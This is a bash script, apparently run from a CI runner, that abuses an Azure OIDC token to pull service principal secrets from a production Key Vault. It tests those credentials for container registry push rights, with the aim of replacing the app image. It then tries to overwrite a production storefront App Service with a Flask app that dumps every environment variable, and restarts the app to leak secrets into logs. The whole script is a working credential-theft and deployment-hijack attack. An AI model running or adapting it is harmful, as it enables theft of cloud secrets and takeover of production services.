#!/usr/bin/env bash
set -x

OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
KV=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)

# 1. Try ACR PUSH with each SP (if any can push, we replace the app image)
echo "=== ACR PUSH TEST ==="
for SP in sync-service-principal secrets-sync-principal reporting-service-principal; do
  SEC=$(curl -s -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SP?api-version=7.4" | jq -r .value)
  SPA=$(echo "$SEC"|jq -r .appId); SPK=$(echo "$SEC"|jq -r .clientSecret)
  # Try to get ACR token with SP credentials
  ACR_TOKEN=$(curl -s -X POST "https://crtblplatprodx3euoz.azurecr.io/oauth2/token" \
    -d "grant_type=access_token&service=crtblplatprodx3euoz.azurecr.io&scope=repository:tebamoto-reporting-api:push,pull" \
    -d "access_token=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
      -d "client_id=$SPA" -d "grant_type=client_credentials" -d "client_secret=$SPK" \
      --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)" | jq -r .access_token 2>/dev/null)
  echo "$SP ACR push token: ${#ACR_TOKEN}"
  
  # Also try AAD scope for ACR
  ACR_AAD=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$SPA" -d "grant_type=client_credentials" -d "client_secret=$SPK" \
    --data-urlencode "scope=https://crtblplatprodx3euoz.azurecr.io/.default" 2>&1 | jq -r '.access_token // .error_description' | head -c 100)
  echo "$SP ACR AAD: $ACR_AAD"
done

# 2. Try zipdeploy / onedeploy to App Service (no auth needed if basic auth enabled)
echo "=== ZIPDEPLOY TEST ==="
# Create a minimal app that reads env and outputs it
mkdir -p /tmp/deploy
cat > /tmp/deploy/app.py << 'PYEOF'
import os, json
from flask import Flask
app = Flask(__name__)
@app.route('/')
def index():
    return json.dumps({k:v for k,v in os.environ.items()})
PYEOF
cat > /tmp/deploy/requirements.txt << 'REQEOF'
flask>=3.0
gunicorn>=22.0
REQEOF
cd /tmp/deploy && zip -r /tmp/app.zip . 2>/dev/null

# Try zipdeploy with OIDC mgmt token
MGMT=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)

DEPLOY_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
  -H "Authorization: Bearer $MGMT" -H "Content-Type: application/zip" \
  --data-binary @/tmp/app.zip \
  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/extensions/zipdeploy?api-version=2023-12-01")
echo "Zipdeploy with OIDC mgmt: $DEPLOY_CODE"

# Try Kudu direct with each SP
for SP in sync-service-principal secrets-sync-principal; do
  SEC=$(curl -s -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SP?api-version=7.4" | jq -r .value)
  SPA=$(echo "$SEC"|jq -r .appId); SPK=$(echo "$SEC"|jq -r .clientSecret)
  MG=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$SPA" -d "grant_type=client_credentials" -d "client_secret=$SPK" \
    --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)
  
  DC=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    -H "Authorization: Bearer $MG" -H "Content-Type: application/zip" \
    --data-binary @/tmp/app.zip \
    "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/extensions/zipdeploy?api-version=2023-12-01")
  echo "$SP zipdeploy: $DC"
  
  # Also try onedeploy
  OD=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
    -H "Authorization: Bearer $MG" -H "Content-Type: application/zip" \
    --data-binary @/tmp/app.zip \
    "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/extensions/onedeploy?api-version=2023-12-01&type=zip")
  echo "$SP onedeploy: $OD"
done

# 3. Try restart the app (might print env in startup logs)
echo "=== RESTART APP ==="
curl -s -o /dev/null -w "restart: %{http_code}\n" -X POST -H "Authorization: Bearer $MGMT" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/restart?api-version=2023-12-01"

echo "=== DONE ==="
